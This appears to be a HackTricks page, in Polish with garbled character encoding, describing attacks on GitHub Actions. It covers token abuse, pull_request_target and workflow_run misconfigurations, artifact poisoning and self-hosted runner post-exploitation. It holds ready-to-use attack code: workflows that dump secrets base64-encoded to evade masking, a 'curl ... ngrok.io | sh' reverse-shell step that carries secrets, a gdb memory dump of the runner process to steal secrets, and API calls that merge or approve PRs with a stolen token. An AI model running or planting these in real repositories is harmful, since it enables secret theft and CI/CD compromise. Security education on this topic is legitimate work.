# Abusing Github Actions

{% hint style="success" %}
Naucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) albo **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

## Podstawowe Informacje

Na tej stronie znajdziesz:

* **Podsumowanie wszystkich skutkÃ³w** uzyskania dostÄ™pu do Github Action przez atakujÄ…cego
* RÃ³Å¼ne sposoby na **uzyskanie dostÄ™pu do akcji**:
* Posiadanie **uprawnieÅ„** do tworzenia akcji
* Wykorzystywanie **pull request** zwiÄ…zanych z triggerami
* Wykorzystywanie **innych zewnÄ™trznych technik dostÄ™pu**
* **Pivoting** z juÅ¼ skompromitowanego repozytorium
* Na koniec, sekcja o **technikach post-exploitation do wykorzystywania akcji od wewnÄ…trz** (powodujÄ…c wspomniane skutki)

## Podsumowanie SkutkÃ³w

Wprowadzenie do [**Github Actions sprawdÅº podstawowe informacje**](../basic-github-information.md#github-actions).

JeÅ›li moÅ¼esz **wykonywaÄ‡ dowolne Github actions/wstrzykiwaÄ‡ kod** w **repozytorium**, moÅ¼esz byÄ‡ w stanie:

* **KraÅ›Ä‡** **secrets** z tego repozytorium/organizacji.
* JeÅ›li moÅ¼esz tylko wstrzykiwaÄ‡, moÅ¼esz kraÅ›Ä‡ wszystko, co juÅ¼ jest obecne w workflow.
* WykorzystywaÄ‡ **uprawnienia repozytorium** do uzyskania dostÄ™pu do innych platform, takich jak AWS i GCP.
* **WykonywaÄ‡ kod w niestandardowych workerach** (jeÅ›li sÄ… uÅ¼ywane niestandardowe workery) i prÃ³bowaÄ‡ pivotowaÄ‡ stamtÄ…d.
* **NadpisywaÄ‡** kod **repozytorium**.
* To zaleÅ¼y od uprawnieÅ„ `GITHUB_TOKEN` (jeÅ›li sÄ…).
* **KompromitowaÄ‡** **wdroÅ¼enia** i inne **artefakty**.
* JeÅ›li kod wdraÅ¼a lub przechowuje coÅ›, moÅ¼esz to zmodyfikowaÄ‡ i uzyskaÄ‡ dalszy dostÄ™p.

## GITHUB\_TOKEN

Ten "**secret**" (pochodzÄ…cy z `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) jest nadawany, gdy administrator wÅ‚Ä…czy tÄ™ opcjÄ™:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Ten token jest tym samym, ktÃ³rego uÅ¼yje **Github Application**, wiÄ™c moÅ¼e uzyskaÄ‡ dostÄ™p do tych samych endpointÃ³w: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github powinien wydaÄ‡ [**flow**](https://github.com/github/roadmap/issues/74), ktÃ³ry **umoÅ¼liwia dostÄ™p miÄ™dzy repozytoriami** w GitHub, wiÄ™c repozytorium moÅ¼e uzyskaÄ‡ dostÄ™p do innych wewnÄ™trznych repozytoriÃ³w za pomocÄ… `GITHUB_TOKEN`.
{% endhint %}

MoÅ¼esz zobaczyÄ‡ moÅ¼liwe **uprawnienia** tego tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

ZauwaÅ¼, Å¼e token **wygasa po zakoÅ„czeniu zadania**.\
Te tokeny wyglÄ…dajÄ… tak: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

NiektÃ³re interesujÄ…ce rzeczy, ktÃ³re moÅ¼esz zrobiÄ‡ z tym tokenem:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="ZatwierdÅº PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
ZwrÃ³Ä‡ uwagÄ™, Å¼e w kilku przypadkach bÄ™dziesz mÃ³gÅ‚ znaleÅºÄ‡ **tokeny uÅ¼ytkownikÃ³w github wewnÄ…trz Å›rodowisk Github Actions lub w sekretnych zmiennych**. Te tokeny mogÄ… daÄ‡ ci wiÄ™cej uprawnieÅ„ do repozytorium i organizacji.
{% endhint %}

<details>

<summary>Wylistuj sekrety w outputcie Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj reverse shell z secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

MoÅ¼liwe jest sprawdzenie uprawnieÅ„ nadanych Tokenowi Github w repozytoriach innych uÅ¼ytkownikÃ³w **sprawdzajÄ…c logi** akcji:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozwolone Wykonanie

{% hint style="info" %}
To byÅ‚by najÅ‚atwiejszy sposÃ³b na skompromitowanie Github actions, poniewaÅ¼ ten przypadek zakÅ‚ada, Å¼e masz dostÄ™p do **utworzenia nowego repozytorium w organizacji** lub masz **uprawnienia do zapisu w repozytorium**.

JeÅ›li jesteÅ› w tej sytuacji, moÅ¼esz po prostu sprawdziÄ‡ [techniki Post Exploitation](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Wykonanie z Utworzenia Repozytorium

W przypadku, gdy czÅ‚onkowie organizacji mogÄ… **tworzyÄ‡ nowe repozytoria** i moÅ¼esz wykonywaÄ‡ github actions, moÅ¼esz **utworzyÄ‡ nowe repozytorium i ukraÅ›Ä‡ sekrety ustawione na poziomie organizacji**.

### Wykonanie z Nowej GaÅ‚Ä™zi

JeÅ›li moÅ¼esz **utworzyÄ‡ nowÄ… gaÅ‚Ä…Åº w repozytorium, ktÃ³re juÅ¼ zawiera skonfigurowanÄ… Github Action**, moÅ¼esz jÄ… **zmodyfikowaÄ‡**, **przesÅ‚aÄ‡** zawartoÅ›Ä‡, a nastÄ™pnie **wykonaÄ‡ tÄ™ akcjÄ™ z nowej gaÅ‚Ä™zi**. W ten sposÃ³b moÅ¼esz **wykraÅ›Ä‡ sekrety na poziomie repozytorium i organizacji** (ale musisz wiedzieÄ‡, jak siÄ™ nazywajÄ…).

MoÅ¼esz sprawiÄ‡, Å¼e zmodyfikowana akcja bÄ™dzie wykonywalna **rÄ™cznie**, gdy zostanie **utworzony PR** lub gdy **zostanie przesÅ‚any jakiÅ› kod** (w zaleÅ¼noÅ›ci od tego, jak gÅ‚oÅ›no chcesz byÄ‡):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
IstniejÄ… rÃ³Å¼ne wyzwalacze, ktÃ³re mogÄ… pozwoliÄ‡ atakujÄ…cemu na **wykonanie Github Action z innego repozytorium**. JeÅ›li te wyzwalane akcje sÄ… Åºle skonfigurowane, atakujÄ…cy moÅ¼e je skompromitowaÄ‡.
{% endhint %}

### `pull_request`

Wyzwalacz workflow **`pull_request`** uruchomi workflow za kaÅ¼dym razem, gdy otrzymany zostanie pull request z pewnymi wyjÄ…tkami: domyÅ›lnie, jeÅ›li jest to **pierwszy raz**, gdy **wspÃ³Å‚pracujesz**, jakiÅ› **opiekun** bÄ™dzie musiaÅ‚ **zatwierdziÄ‡** **uruchomienie** workflow:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
PoniewaÅ¼ **domyÅ›lne ograniczenie** dotyczy **pierwszych** wspÃ³Å‚pracownikÃ³w, moÅ¼esz przyczyniÄ‡ siÄ™ do **naprawienia waÅ¼nego bÅ‚Ä™du/literÃ³wki**, a nastÄ™pnie wysÅ‚aÄ‡ **inne PR-y, aby naduÅ¼yÄ‡ swoich nowych uprawnieÅ„ `pull_request`**.

**TestowaÅ‚em to i to nie dziaÅ‚a**: ~~InnÄ… opcjÄ… byÅ‚oby utworzenie konta z nazwÄ… osoby, ktÃ³ra przyczyniÅ‚a siÄ™ do projektu i usunÄ™Å‚a swoje konto.~~
{% endhint %}

Ponadto, domyÅ›lnie **zapobiega uprawnieniom do zapisu** i **dostÄ™powi do sekretÃ³w** w docelowym repozytorium, jak wspomniano w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Z wyjÄ…tkiem `GITHUB_TOKEN`, **sekrety nie sÄ… przekazywane do runnera** gdy workflow jest wyzwalany z **forkowanego** repozytorium. **`GITHUB_TOKEN` ma uprawnienia tylko do odczytu** w pull requestach **z forkowanych repozytoriÃ³w**.

AtakujÄ…cy moÅ¼e zmodyfikowaÄ‡ definicjÄ™ Github Action, aby wykonaÄ‡ dowolne rzeczy i dodaÄ‡ dowolne akcje. Jednak nie bÄ™dzie w stanie ukraÅ›Ä‡ sekretÃ³w ani nadpisaÄ‡ repozytorium z powodu wspomnianych ograniczeÅ„.

{% hint style="danger" %}
**Tak, jeÅ›li atakujÄ…cy zmieni w PR github action, ktÃ³re zostanie wyzwolone, jego Github Action bÄ™dzie uÅ¼ywane, a nie to z oryginalnego repo!**
{% endhint %}

PoniewaÅ¼ atakujÄ…cy rÃ³wnieÅ¼ kontroluje kod, ktÃ³ry jest wykonywany, nawet jeÅ›li nie ma sekretÃ³w ani uprawnieÅ„ do zapisu na `GITHUB_TOKEN`, atakujÄ…cy moÅ¼e na przykÅ‚ad **przesÅ‚aÄ‡ zÅ‚oÅ›liwe artefakty**.

### **`pull_request_target`**

Wyzwalacz workflow **`pull_request_target`** ma **uprawnienia do zapisu** w docelowym repozytorium i **dostÄ™p do sekretÃ³w** (i nie pyta o zgodÄ™).

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e wyzwalacz workflow **`pull_request_target`** **dziaÅ‚a w kontekÅ›cie bazowym**, a nie w tym nadanym przez PR (aby **nie wykonywaÄ‡ nieufnego kodu**). WiÄ™cej informacji o `pull_request_target` znajdziesz w [**dokumentacji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Ponadto, wiÄ™cej informacji na temat tego konkretnego niebezpiecznego uÅ¼ycia znajdziesz w [**poÅ›cie na blogu github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

MoÅ¼e siÄ™ wydawaÄ‡, Å¼e poniewaÅ¼ **wykonywany workflow** jest zdefiniowany w **bazie**, a **nie w PR**, jest **bezpieczne** uÅ¼ywanie **`pull_request_target`**, ale sÄ… **kilka przypadkÃ³w, gdzie tak nie jest**.

A ten bÄ™dzie miaÅ‚ **dostÄ™p do sekretÃ³w**.

### `workflow_run`

Wyzwalacz [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) pozwala uruchomiÄ‡ workflow z innego, gdy jest `completed`, `requested` lub `in_progress`.

W tym przykÅ‚adzie workflow jest skonfigurowany do uruchomienia po zakoÅ„czeniu oddzielnego workflow "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ponadto, zgodnie z dokumentacjÄ…: Workflow uruchomiony przez zdarzenie `workflow_run` moÅ¼e **uzyskaÄ‡ dostÄ™p do sekretÃ³w i zapisywaÄ‡ tokeny, nawet jeÅ›li poprzedni workflow nie mÃ³gÅ‚ tego zrobiÄ‡**.

Tego rodzaju workflow moÅ¼e byÄ‡ zaatakowany, jeÅ›li **zaleÅ¼y** od **workflow**, ktÃ³ry moÅ¼e byÄ‡ **wywoÅ‚any** przez zewnÄ™trznego uÅ¼ytkownika za pomocÄ… **`pull_request`** lub **`pull_request_target`**. Kilka podatnych przykÅ‚adÃ³w moÅ¼na znaleÅºÄ‡ w [**tym blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Pierwszy z nich polega na tym, Å¼e workflow uruchomiony przez **`workflow_run`** pobiera kod atakujÄ…cego: `${{ github.event.pull_request.head.sha }}`\
Drugi polega na **przekazaniu** **artefaktu** z **niezaufanego** kodu do workflow **`workflow_run`** i uÅ¼yciu zawartoÅ›ci tego artefaktu w sposÃ³b, ktÃ³ry czyni go **podatnym na RCE**.

### `workflow_call`

TODO

TODO: SprawdÅº, czy podczas wykonywania z pull\_request uÅ¼ywany/pobierany kod pochodzi z oryginaÅ‚u czy z forka PR

## Wykorzystywanie Wykonania Forka

WspomnieliÅ›my o wszystkich sposobach, w jakie zewnÄ™trzny atakujÄ…cy mÃ³gÅ‚by zmusiÄ‡ workflow GitHub do wykonania, teraz przyjrzyjmy siÄ™, jak te wykonania, jeÅ›li sÄ… Åºle skonfigurowane, mogÄ… byÄ‡ wykorzystane:

### Niezaufane wykonanie checkout

W przypadku **`pull_request`,** workflow zostanie wykonany w **kontekÅ›cie PR** (wiÄ™c wykona **zÅ‚oÅ›liwy kod PR**), ale ktoÅ› musi go **najpierw autoryzowaÄ‡** i bÄ™dzie dziaÅ‚aÅ‚ z pewnymi [ograniczeniami](./#pull\_request).

W przypadku workflow uÅ¼ywajÄ…cego **`pull_request_target` lub `workflow_run`**, ktÃ³ry zaleÅ¼y od workflow, ktÃ³ry moÅ¼e byÄ‡ wywoÅ‚any z **`pull_request_target` lub `pull_request`**, kod z oryginalnego repozytorium zostanie wykonany, wiÄ™c **atakujÄ…cy nie moÅ¼e kontrolowaÄ‡ wykonanego kodu**.

{% hint style="danger" %}
JednakÅ¼e, jeÅ›li **akcja** ma **wyraÅºny checkout PR**, ktÃ³ry **pobierze kod z PR** (a nie z bazy), uÅ¼yje kodu kontrolowanego przez atakujÄ…cego. Na przykÅ‚ad (sprawdÅº liniÄ™ 12, gdzie pobierany jest kod PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NIEBEZPIECZNE. Podane tylko jako przykÅ‚ad.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencjalnie **niezaufany kod jest uruchamiany podczas `npm install` lub `npm build`**, poniewaÅ¼ skrypty budowania i referencje **pakietÃ³w sÄ… kontrolowane przez autora PR**.

{% hint style="warning" %}
GitHub dork do wyszukiwania podatnych akcji to: `event.pull_request pull_request_target extension:yml`, jednak istniejÄ… rÃ³Å¼ne sposoby konfiguracji zadaÅ„, aby byÅ‚y wykonywane bezpiecznie, nawet jeÅ›li akcja jest skonfigurowana niebezpiecznie (np. uÅ¼ywajÄ…c warunkÃ³w dotyczÄ…cych tego, kto jest autorem generujÄ…cym PR).
{% endhint %}

### Iniekcje SkryptÃ³w w KontekÅ›cie <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e istniejÄ… pewne [**konteksty GitHub**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context), ktÃ³rych wartoÅ›ci sÄ… **kontrolowane** przez **uÅ¼ytkownika** tworzÄ…cego PR. JeÅ›li akcja GitHub uÅ¼ywa tych **danych do wykonania czegokolwiek**, moÅ¼e to prowadziÄ‡ do **arbitralnego wykonania kodu:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Iniekcja Skryptu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Z dokumentacji: MoÅ¼esz udostÄ™pniÄ‡ **zmiennÄ… Å›rodowiskowÄ… dla dowolnych kolejnych krokÃ³w** w zadaniu workflow, definiujÄ…c lub aktualizujÄ…c zmiennÄ… Å›rodowiskowÄ… i zapisujÄ…c jÄ… do pliku Å›rodowiskowego **`GITHUB_ENV`**.

JeÅ›li atakujÄ…cy mÃ³gÅ‚by **wstrzyknÄ…Ä‡ dowolnÄ… wartoÅ›Ä‡** do tej **zmiennej Å›rodowiskowej**, mÃ³gÅ‚by wstrzyknÄ…Ä‡ zmienne Å›rodowiskowe, ktÃ³re mogÅ‚yby wykonaÄ‡ kod w kolejnych krokach, takie jak **LD\_PRELOAD** lub **NODE\_OPTIONS**.

Na przykÅ‚ad ([**to**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**to**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), wyobraÅº sobie workflow, ktÃ³ry ufa przesÅ‚anemu artefaktowi, aby przechowywaÄ‡ jego zawartoÅ›Ä‡ w zmiennej Å›rodowiskowej **`GITHUB_ENV`**. AtakujÄ…cy mÃ³gÅ‚by przesÅ‚aÄ‡ coÅ› takiego, aby go skompromitowaÄ‡:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Podatne Akcje GitHub Stron Trzecich

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Jak wspomniano w [**tym wpisie na blogu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ta akcja GitHub pozwala na dostÄ™p do artefaktÃ³w z rÃ³Å¼nych workflow, a nawet repozytoriÃ³w.

Problem polega na tym, Å¼e jeÅ›li parametr **`path`** nie jest ustawiony, artefakt jest rozpakowywany w bieÅ¼Ä…cym katalogu i moÅ¼e nadpisywaÄ‡ pliki, ktÃ³re mogÄ… byÄ‡ pÃ³Åºniej uÅ¼ywane lub nawet wykonywane w workflow. Dlatego, jeÅ›li artefakt jest podatny, atakujÄ…cy mÃ³gÅ‚by to wykorzystaÄ‡, aby skompromitowaÄ‡ inne workflow ufajÄ…ce artefaktowi.

PrzykÅ‚ad podatnego workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
To moÅ¼na zaatakowaÄ‡ za pomocÄ… tego workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Inny DostÄ™p ZewnÄ™trzny

### PrzejÄ™cie UsuniÄ™tego Repozytorium Namespace

JeÅ›li konto zmieni swojÄ… nazwÄ™, inny uÅ¼ytkownik moÅ¼e zarejestrowaÄ‡ konto z tÄ… nazwÄ… po pewnym czasie. JeÅ›li repozytorium miaÅ‚o **mniej niÅ¼ 100 gwiazdek przed zmianÄ… nazwy**, Github pozwoli nowemu zarejestrowanemu uÅ¼ytkownikowi o tej samej nazwie utworzyÄ‡ **repozytorium o tej samej nazwie**, co usuniÄ™te.

{% hint style="danger" %}
WiÄ™c jeÅ›li akcja uÅ¼ywa repozytorium z nieistniejÄ…cego konta, nadal istnieje moÅ¼liwoÅ›Ä‡, Å¼e atakujÄ…cy moÅ¼e utworzyÄ‡ to konto i skompromitowaÄ‡ akcjÄ™.
{% endhint %}

JeÅ›li inne repozytoria uÅ¼ywaÅ‚y **zaleÅ¼noÅ›ci z repozytoriÃ³w tego uÅ¼ytkownika**, atakujÄ…cy bÄ™dzie mÃ³gÅ‚ je przejÄ…Ä‡. Tutaj masz bardziej szczegÃ³Å‚owe wyjaÅ›nienie: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
W tej sekcji omÃ³wimy techniki, ktÃ³re pozwolÄ… na **pivotowanie z jednego repozytorium do drugiego**, zakÅ‚adajÄ…c, Å¼e mamy jakiÅ› rodzaj dostÄ™pu do pierwszego (sprawdÅº poprzedniÄ… sekcjÄ™).
{% endhint %}

### Zatrucie Cache

Cache jest utrzymywany miÄ™dzy **uruchomieniami workflow w tej samej gaÅ‚Ä™zi**. Oznacza to, Å¼e jeÅ›li atakujÄ…cy **skompromituje** **pakiet**, ktÃ³ry jest nastÄ™pnie przechowywany w cache i **pobrany** oraz wykonany przez **bardziej uprzywilejowany** workflow, bÄ™dzie mÃ³gÅ‚ rÃ³wnieÅ¼ **skompromitowaÄ‡** ten workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Zatrucie ArtefaktÃ³w

Workflows mogÄ… uÅ¼ywaÄ‡ **artefaktÃ³w z innych workflows, a nawet repozytoriÃ³w**, jeÅ›li atakujÄ…cy zdoÅ‚a **skompromitowaÄ‡** Github Action, ktÃ³ra **przesyÅ‚a artefakt**, ktÃ³ry jest pÃ³Åºniej uÅ¼ywany przez inny workflow, moÅ¼e **skompromitowaÄ‡ inne workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation z Akcji

### DostÄ™p do AWS i GCP przez OIDC

SprawdÅº nastÄ™pujÄ…ce strony:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### DostÄ™p do sekretÃ³w <a href="#accessing-secrets" id="accessing-secrets"></a>

JeÅ›li wstrzykujesz zawartoÅ›Ä‡ do skryptu, warto wiedzieÄ‡, jak uzyskaÄ‡ dostÄ™p do sekretÃ³w:

* JeÅ›li sekret lub token jest ustawiony jako **zmienna Å›rodowiskowa**, moÅ¼na go bezpoÅ›rednio uzyskaÄ‡ przez Å›rodowisko za pomocÄ… **`printenv`**.

<details>

<summary>Lista sekretÃ³w w output Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Uzyskaj reverse shell z secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* JeÅ›li sekret jest uÅ¼ywany **bezpoÅ›rednio w wyraÅ¼eniu**, wygenerowany skrypt powÅ‚oki jest przechowywany **na dysku** i jest dostÄ™pny.
* ```bash
cat /home/runner/work/_temp/*
```
* Dla akcji JavaScript sekrety sÄ… przesyÅ‚ane przez zmienne Å›rodowiskowe
* ```bash
ps axe | grep node
```
* Dla **niestandardowej akcji**, ryzyko moÅ¼e siÄ™ rÃ³Å¼niÄ‡ w zaleÅ¼noÅ›ci od tego, jak program uÅ¼ywa sekretu uzyskanego z **argumentu**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusing Self-hosted runners

Sposobem na znalezienie, ktÃ³re **Github Actions sÄ… wykonywane w infrastrukturze nie-githubowej**, jest wyszukiwanie **`runs-on: self-hosted`** w konfiguracji yaml Github Action.

**Self-hosted** runners mogÄ… mieÄ‡ dostÄ™p do **dodatkowych wraÅ¼liwych informacji**, do innych **systemÃ³w sieciowych** (podatne punkty koÅ„cowe w sieci? usÅ‚uga metadanych?) lub, nawet jeÅ›li sÄ… izolowane i niszczone, **wiÄ™cej niÅ¼ jedna akcja moÅ¼e byÄ‡ uruchomiona jednoczeÅ›nie** i zÅ‚oÅ›liwa akcja moÅ¼e **ukraÅ›Ä‡ sekrety** innej.

W self-hosted runners moÅ¼liwe jest rÃ³wnieÅ¼ uzyskanie **sekretÃ³w z procesu \_Runner.Listener\_\*\* ktÃ³ry bÄ™dzie zawieraÅ‚ wszystkie sekrety workflow na kaÅ¼dym etapie poprzez zrzut jego pamiÄ™ci:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

SprawdÅº [**ten post, aby uzyskaÄ‡ wiÄ™cej informacji**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

MoÅ¼liwe jest tworzenie Github actions, ktÃ³re bÄ™dÄ… **budowaÄ‡ i przechowywaÄ‡ obraz Docker wewnÄ…trz Github**.\
PrzykÅ‚ad moÅ¼na znaleÅºÄ‡ w poniÅ¼szym rozwijanym elemencie:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Jak moÅ¼na byÅ‚o zobaczyÄ‡ w poprzednim kodzie, rejestr Github jest hostowany w **`ghcr.io`**.

UÅ¼ytkownik z uprawnieniami do odczytu repozytorium bÄ™dzie mÃ³gÅ‚ pobraÄ‡ obraz Docker za pomocÄ… osobistego tokena dostÄ™pu:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
NastÄ™pnie uÅ¼ytkownik moÅ¼e wyszukaÄ‡ **ujawnione sekrety w warstwach obrazu Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### WraÅ¼liwe informacje w logach Github Actions

